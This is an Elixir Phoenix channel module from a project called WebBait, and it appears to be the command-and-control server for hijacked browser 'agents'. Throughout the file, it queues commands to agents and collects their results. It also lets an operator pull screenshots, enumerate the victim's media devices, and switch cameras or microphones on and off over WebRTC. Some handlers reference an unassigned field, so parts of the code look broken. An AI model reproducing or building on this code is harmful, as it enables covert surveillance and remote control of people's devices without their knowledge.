defmodule WebBaitWeb.AgentChannel do
  use WebBaitWeb, :channel
  alias WebBait.Presence
  alias WebBait.C2
  require Logger
  require Membrane.Logger

  @impl true
  def join("agent:" <> agentId, params, socket) do
    simulcast? = Map.get(params, "isSimulcastOn")
    master = Map.has_key?(socket.assigns, :current_user)

    if not master do
      Presence.track(self(), "agents:presence", agentId, %{})
    else
      Phoenix.PubSub.broadcast(WebBait.PubSub, "agents:presence", %{
        event: "presence_diff",
        payload: %{joins: Presence.list("agents:presence"), leaves: %{}}
      })

    end

    socket =
      socket
      |> assign(:master, master)
      |> assign(:agentId, agentId)
      |> assign(:room_id, agentId)
      |> assign(:simulcast?, simulcast?)
      |> assign(:lastScreenshot, "")

    case :global.whereis_name(agentId) do
      :undefined ->
        WebBait.AgentRTC.start(%{room_id: agentId, simulcast?: simulcast?},
          name: {:global, agentId}
        )

      pid ->
        {:ok, pid}
    end
    |> handle_start_room_result(socket)
  end

  defp handle_start_room_result(start_room_result, socket) do
    case start_room_result do
      {:ok, room_pid} ->
        do_join(assign(socket, :room_pid, room_pid))

      {:error, {:already_started, room_pid}} ->
        do_join(assign(socket, :room_pid, room_pid))

      {:error, reason} ->
        Logger.error("""
        Failed to start room.
        Room: #{inspect(socket.assigns.room_id)}
        Reason: #{inspect(reason)}
        """)

        {:error, %{reason: "failed to start room"}}
    end
  end

  defp do_join(socket) do
    peer_id = "#{UUID.uuid4()}"

    try do
      WebBait.AgentRTC.add_peer_channel(socket.assigns.room_pid, self(), peer_id)
    catch
      :exit, _reason ->
        Logger.info(
          "Room #{inspect(socket.assigns.room_id)} died when trying to join. Creating a new one."
        )

        WebBait.AgentRTC.start(
          %{room_id: socket.assigns.room_id, simulcast?: socket.assigns.simulcast?},
          name: {:global, socket.assigns.room_id}
        )
        |> handle_start_room_result(socket)
    else
      :ok ->
        Process.monitor(socket.assigns.room_pid)

        {
          :ok,
          socket
          |> assign(:peer_id, peer_id)
        }
    end
  end

  @impl true
  def handle_in("join", _params, socket) do
    {_, s} = do_join(socket)
    {:noreply, s}
  end

  def handle_in("commands", _payload, socket) do
    if not socket.assigns.master do
      commands = C2.get_agent_undelivered_commmands(socket.assigns.agentId)

      for command <- commands do
        push(socket, "cmd", %{"cmd" => command.cmd, "cmdId" => command.cmdId})
      end
    end

    {:noreply, socket}
  end

  def handle_in("received", %{"cmdId" => cmdId}, socket) do
    if not socket.assigns.master do
      C2.mark_command_received(cmdId)
      Phoenix.PubSub.broadcast(WebBait.PubSub, "agents:#{socket.assigns.agent.id}", "commands")
    end

    {:noreply, socket}
  end

  def handle_in("result", %{"cmdId" => cmdId, "result" => result}, socket) do
    if not socket.assigns.master do
      C2.set_command_result(cmdId, result)
      Phoenix.PubSub.broadcast(WebBait.PubSub, "agents:#{socket.assigns.agent.id}", "commands")
    end

    {:noreply, socket}
  end

  def handle_in("mediaEvent", %{"data" => event}, socket) do
    send(socket.assigns.room_pid, {:media_event, socket.assigns.peer_id, event})

    {:noreply, socket}
  end

  def handle_in("error", params, socket) do
    IO.inspect(params)
    {:noreply, socket}
  end

  def handle_in("send-devices", _params, socket) do
    if socket.assigns.master do
      Phoenix.PubSub.broadcast(WebBait.PubSub, "agent:" <> socket.assigns.agentId, "send-devices")
    end

    {:noreply, socket}
  end

  def handle_in("devices", %{"devices" => devices}, socket) do
    if not socket.assigns.master do
      Phoenix.PubSub.broadcast(
        WebBait.PubSub,
        "agents:" <> socket.assigns.agentId,
        {"devices", devices}
      )
    end

    {:noreply, socket}
  end

  def handle_in("screenshot", %{"img" => img}, socket) do
    if not socket.assigns.master do
      Phoenix.PubSub.broadcast(
        WebBait.PubSub,
        "agent:" <> socket.assigns.agentId,
        {"screenshot", img}
      )
    end

    {:noreply, assign(socket, :lastScreenshot, img)}
  end

  def handle_in("screenshot", _params, socket) do
    if socket.assigns.master do
      Phoenix.PubSub.broadcast(
        WebBait.PubSub,
        "agent:" <> socket.assigns.agentId,
        "screenshot"
      )
    end

    {:noreply, socket}
  end

  def handle_in("send-lastScreenshot", _params, socket) do
    if socket.assigns.master do
      Phoenix.PubSub.broadcast(
        WebBait.PubSub,
        "agent:" <> socket.assigns.agentId,
        "send-lastScreenshot"
      )
    end

    {:noreply, socket}
  end

  def handle_in("source-activated", %{"sourceId" => sourceId}, socket) do
    if socket.assigns.master do
      Phoenix.PubSub.broadcast(
        WebBait.PubSub,
        "agents:" <> socket.assigns.agentId,
        {"source-activated", sourceId}
      )
    end

    {:noreply, socket}
  end

  def handle_in("source-deactivated", %{"sourceId" => sourceId}, socket) do
    if socket.assigns.master do
      Phoenix.PubSub.broadcast(
        WebBait.PubSub,
        "agents:" <> socket.assigns.agentId,
        {"source-deactivated", sourceId}
      )
    end

    {:noreply, socket}
  end

  def handle_in("activate", %{"deviceId" => sourceId}, socket) do
    if socket.assigns.master do
      Phoenix.PubSub.broadcast(
        WebBait.PubSub,
        "agent:" <> socket.assigns.agentId,
        {"activate", sourceId}
      )
    end

    {:noreply, socket}
  end

  def handle_in("deactivate", %{"deviceId" => sourceId}, socket) do
    if socket.assigns.master do
      Phoenix.PubSub.broadcast(
        WebBait.PubSub,
        "agent:" <> socket.assigns.agentId,
        {"deactivate", sourceId}
      )
    end

    {:noreply, socket}
  end

  @impl true
  def handle_info("screenshot", socket) do
    if not socket.assigns.master do
      push(socket, "screenshot", %{})
    end

    {:noreply, socket}
  end

  def handle_info("send-lastScreenshot", socket) do
    if not socket.assigns.master do
      Phoenix.PubSub.broadcast(
        WebBait.PubSub,
        "agent:" <> socket.assigns.agentId,
        {"screenshot", socket.assigns.lastScreenshot}
      )
    end

    {:noreply, socket}
  end

  def handle_info({"screenshot", img}, socket) do
    if socket.assigns.master do
      push(socket, "screenshot", %{"img" => img})
    end

    {:noreply, socket}
  end

  def handle_info({"activate", sourceId}, socket) do
    if not socket.assigns.master do
      push(socket, "activate", %{"deviceId" => sourceId})
    end

    {:noreply, socket}
  end

  def handle_info({"deactivate", sourceId}, socket) do
    if not socket.assigns.master do
      push(socket, "deactivate", %{"deviceId" => sourceId})
    end

    {:noreply, socket}
  end

  def handle_info("send-devices", socket) do
    if not socket.assigns.master do
      push(socket, "send-devices", %{})
    end

    {:noreply, socket}
  end

  def handle_info({"devices", devices}, socket) do
    if socket.assigns.master do
      push(socket, "devices", %{"devices" => devices})
    end

    {:noreply, socket}
  end

  def handle_info({:command, cmd}, socket) do
    if not socket.assigns.master do
      push(socket, "cmd", %{"cmd" => cmd.cmd, "cmdId" => cmd.cmdId})
    end

    {:noreply, socket}
  end

  def handle_info({:media_event, event}, socket) do
    push(socket, "mediaEvent", %{data: event})

    {:noreply, socket}
  end

  def handle_info({:simulcast_config, simulcast_config}, socket) do
    push(socket, "simulcastConfig", %{data: simulcast_config})

    {:noreply, socket}
  end

  def handle_info(:endpoint_crashed, socket) do
    push(socket, "error", %{
      message: "WebRTC Endpoint has crashed. Please refresh the page to reconnect"
    })

    {:stop, :normal, socket}
  end

  def handle_info(
        {:DOWN, _ref, :process, _pid, _reason},
        socket
      ) do
    {:stop, :normal, socket}
  end
end
